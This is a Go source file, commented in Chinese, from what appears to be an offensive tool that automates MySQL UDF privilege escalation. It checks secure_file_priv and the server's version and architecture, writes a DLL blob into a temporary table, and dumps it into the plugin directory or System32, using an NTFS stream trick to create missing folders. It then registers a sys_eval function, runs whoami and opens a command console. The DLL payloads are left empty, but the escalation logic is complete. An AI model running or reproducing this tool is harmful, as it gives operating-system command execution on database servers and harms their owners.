package pac

import (
	"database/sql"
	"fmt"
	"os"
	"strconv"
	"strings"
)

var Win32dll = ""
var Win64dll = ""
var Linux32dll = ""
var Linux64dll = ""

// 获取pplugin路径
func get_plugin(conn *sql.DB) (plugin_path string) {
	Info("获取Plugin路径")
	plugin, err := MysqlCMD("show variables like '%plugin%';", conn)
	if err != nil {
		Err(err)
	}

	if len(plugin) == 0 {
		Info("不存在plugin_dir")
	} else {
		for i, a := range plugin {
			if a["Variable_name"] == "plugin_dir" {
				plugin_path = fmt.Sprintf("%v", plugin[i]["Value"])
				Info(fmt.Sprintf("Plugin路径为：%s", plugin_path))
			} else {
				Info("不存在plugin_dir值,默认将dll导出为C:\\Windows\\System32\\")
				plugin_path = ""
			}
		}
	}
	return plugin_path
}

// 获取系统信息
func get_compile(conn *sql.DB) (compile_version_string string, versioncompilemachine_value string) {
	Info("获取主机版本及架构")
	compile, err := MysqlCMD("show variables like '%compile%';", conn)
	if err != nil {
		Err(err)
	}

	versioncompilemachine_value = fmt.Sprintf("%s", compile[0]["Value"])

	for i, j := range compile {
		if j["Variable_name"] == "version_compile_os" {
			compile_version := compile[i]["Value"]
			compile_version_string = fmt.Sprintf("%s", compile_version)
			Info(fmt.Sprintf("主机系统为：%v", compile_version_string))
		}
	}
	return compile_version_string, versioncompilemachine_value
}

// 获取secur_file_priv信息
func get_secure_file_priv(conn *sql.DB) (secure_file_priv string, result bool) {
	Info("判断是否存在secure_file_priv")
	m, err := MysqlCMD("SHOW VARIABLES LIKE '%secure%';", conn)
	if err != nil {
		//Err(err)
		Info("执行show variables like '%secure%'出错")
		os.Exit(1)
	}
	for i, Variable := range m {
		// Check the Variable_name field of each map
		if Variable["Variable_name"] == "secure_file_priv" {
			// fmt.Println("Variable found!")
			result = true
			secure_file_priv = fmt.Sprintf("%s", m[i]["Value"])
		} else {
			result = false
		}
	}
	return secure_file_priv, result
}

func get_version(conn *sql.DB) (v float64) {
	m, err := MysqlCMD("select @@version;", conn)
	s := fmt.Sprintf("%s", m[0]["@@version"])
	parts1 := strings.Split(s, ".")
	version := fmt.Sprintf("%s.%s", parts1[0], parts1[1])
	v, err = strconv.ParseFloat(version, 64)
	if err != nil {
		fmt.Println(err)
	}

	return v
}

// udf提权具体步骤
func Detail(conn *sql.DB, plugin_path string, dll string, udfname string, databasename string) {
	v := get_version(conn)
	Info("拼接dll数据")
	_, err0 := MysqlCMD(fmt.Sprintf("update %s.temp set data=concat(\"\",%s);", databasename, dll), conn)
	if err0 != nil {
		Info("拼接dll数据出错")
		os.Exit(1)
	}
	if v >= float64(5.1) {
		Info("导出dll")
		_, err := MysqlCMD(fmt.Sprintf("select * from %s.temp into dumpfile \"%s%s.dll\";", databasename, plugin_path, udfname), conn)
		if err != nil {
			Info("导出dll错误，可能不存在lib/plugin目录")
			Info("尝试通过utfs流创建lib/plugin目录")
			_, err := MysqlCMD(fmt.Sprintf("select '1' into dumpfile '%s::$INDEX_ALLOCATION'", plugin_path), conn)
			if err != nil {
				Info("通过ntfs流创建失败！")
				Info("导出dll失败！")
				Err(err)
				os.Exit(1)
			}
		}
		Info("创建sys_eval函数")
		_, err1 := MysqlCMD(fmt.Sprintf("create function sys_eval returns string soname '%s.dll';", udfname), conn)
		if err1 != nil {
			Info("创建动态链接库函数错误")
			Err(err1)
			os.Exit(1)
		}
		Info("执行whoami")
		whoamiresult, err2 := MysqlCMD(fmt.Sprintf("select sys_eval('whoami');"), conn)
		if err2 != nil {
			Info("执行命令出错！")
			Err(err2)
			os.Exit(1)
		}
		fmt.Println(whoamiresult[0]["sys_eval('whoami')"])
		MysqlCMDConsole(conn)
		DropSYSEVAL(conn)

	} else if v < float64(5.1) && v >= float64(5.0) {
		Info("导出dll")
		_, err := MysqlCMD(fmt.Sprintf("select * from %s.temp into dumpfile \"C:\\\\Windows\\\\System32\\\\%s.dll\"", databasename, udfname), conn)
		if err != nil {
			Info("导出dll失败！")
			Err(err)
			os.Exit(1)
		}
		Info("创建sys_eval函数")
		_, err1 := MysqlCMD(fmt.Sprintf("create function sys_eval returns string soname '%s.dll';", udfname), conn)
		if err1 != nil {
			Info("创建动态链接库函数错误！")
			Err(err1)
			os.Exit(1)
		}
		Info("执行whoami命令")
		whoamiresult, err2 := MysqlCMD(fmt.Sprintf("select sys_eval('whoami');"), conn)
		if err2 != nil {
			Info("执行命令出错！")
			Err(err2)
			os.Exit(1)
		}
		fmt.Println(whoamiresult[0]["sys_eval('whoami')"])
		MysqlCMDConsole(conn)
		DropSYSEVAL(conn)

	} else if v < float64(5.0) {
		_, err := MysqlCMD(fmt.Sprintf("select * from %s.temp into dumpfile \"C:\\Windows\\%s.dll\"", databasename, udfname), conn)
		if err != nil {
			Info("导出dll失败！")
			Err(err)
			os.Exit(1)
		}
		_, err1 := MysqlCMD(fmt.Sprintf("create function sys_eval returns string soname '%s.dll';", udfname), conn)
		if err1 != nil {
			Info("创建动态链接库函数错误！")
			Err(err1)
			os.Exit(1)
		}
		_, err2 := MysqlCMD(fmt.Sprintf("select sys_eval('whoami');"), conn)
		if err2 != nil {
			Info("执行命令出错！")
			Err(err2)
			os.Exit(1)
		}

	} else {
		Info("处理版本格式错误！无法进行判断")
	}
}

// 创建数据库、表
func DataMethod(conn *sql.DB) (databasename string) {
	Info("创建数据库")
	databasename = RandStr(3)
	_, err1 := MysqlCMD(fmt.Sprintf("create database %s;", databasename), conn)
	if err1 != nil {
		Err(err1)
		Info("创建数据库出错！")
		//os.Exit(1)
	}

	Info("创建temp表")
	_, err2 := MysqlCMD(fmt.Sprintf("create table %s.temp(data longblob);", databasename), conn)
	if err2 != nil {
		Err(err2)
		Info("创建temp表出错！")
		os.Exit(1)
	}
	Info("插入数据")
	_, err3 := MysqlCMD(fmt.Sprintf("insert into %s.temp values(\"\");", databasename), conn)
	if err3 != nil {
		Err(err3)
		Info("插入数据出错！")
		os.Exit(1)
	}
	return databasename
}

// 系统判断完选择提权方式
func UdfUdfPrivilegeDetail(conn *sql.DB, ostype string, plugin_path string) {
	udfname := RandStr(3)
	databasename := DataMethod(conn)

	if ostype == "Win32" {
		Detail(conn, plugin_path, Win32dll, udfname, databasename)
	} else if ostype == "Win64" {
		Detail(conn, plugin_path, Win64dll, udfname, databasename)
	} else if ostype == "Linux64" {
		Detail(conn, plugin_path, Linux64dll, udfname, databasename)
	} else if ostype == "Linux32" {
		Detail(conn, plugin_path, Linux32dll, udfname, databasename)
	} else {
		Info("错误，无法识别的数据库类型")
	}
}

// 通过系统判断
func ChoiceDetail(conn *sql.DB, compile_version_string string, plugin_path string, versioncompilemachine_value string) {
	if strings.HasPrefix(compile_version_string, "Win") {
		parts := strings.Split(compile_version_string, "in")
		if fmt.Sprintf("%s", parts[1]) == "32" {
			UdfUdfPrivilegeDetail(conn, "Win32", plugin_path)
		} else if fmt.Sprintf("%s", parts[1]) == "64" {
			UdfUdfPrivilegeDetail(conn, "Win64", plugin_path)
		} else {
			Info("无法获取版本，只识别32和64位")
		}
	} else if strings.Contains(strings.ToLower(compile_version_string), "linux") && strings.Contains(strings.ToLower(compile_version_string), "64") {
		UdfUdfPrivilegeDetail(conn, "Linux64", plugin_path)
	} else if strings.Contains(strings.ToLower(compile_version_string), "linux") && strings.Contains(strings.ToLower(compile_version_string), "32") {
		UdfUdfPrivilegeDetail(conn, "Linux32", plugin_path)
	} else if strings.Contains(strings.ToLower(compile_version_string), "linux") && strings.Contains(strings.ToLower(versioncompilemachine_value), "64") {
		UdfUdfPrivilegeDetail(conn, "Linux64", plugin_path)
	} else if strings.Contains(strings.ToLower(compile_version_string), "linux") {
		UdfUdfPrivilegeDetail(conn, "Linux32", plugin_path)
	} else {
		Info("无法获取系统版本，只识别32和64")
	}

}

// 通过secure_file_priv判断
func UdfPrivilege(conn *sql.DB) {
	// 获取secure_file_priv
	secure_file_priv, result := get_secure_file_priv(conn)
	if result == true {
		Info("存在secure_file_priv")
		if secure_file_priv == "NULL" {
			Info("secure_file_priv的值为NULL，不允许导入或导出")
		} else if secure_file_priv == "/" {
			Info("secure_file_priv的值为/，只允许在 / 目录导入导出")
		} else if len(fmt.Sprintf("%s", secure_file_priv)) == 0 {
			Info("secure_file_priv的值为空，不限制导入导出，可以尝试提权")
			// 获取Plugin路径
			plugin_path := get_plugin(conn)

			// 获取主机版本架构
			compile_version_string, versioncompilemachine_value := get_compile(conn)

			// 根据主机版本架构提权
			ChoiceDetail(conn, compile_version_string, plugin_path, versioncompilemachine_value)

		} else {
			Info("secure_file_priv的值不为NULL、空和\\,请手动尝试！")
		}
	} else {
		Info("不存在secure_file_priv,尝试提权")

		// 获取主机版本架构
		compile_version_string, versioncompilemachine_value := get_compile(conn)

		// 获取Plugin路径
		plugin_path := get_plugin(conn)

		// 根据主机版本架构提权
		ChoiceDetail(conn, compile_version_string, plugin_path, versioncompilemachine_value)
	}
}

func DropSYSEVAL(conn *sql.DB) {
	Info("执行完毕，删除sys_eval函数")
	_, err := MysqlCMD("drop FUNCTION sys_eval;", conn)
	if err != nil {
		Err(err)
	}
}
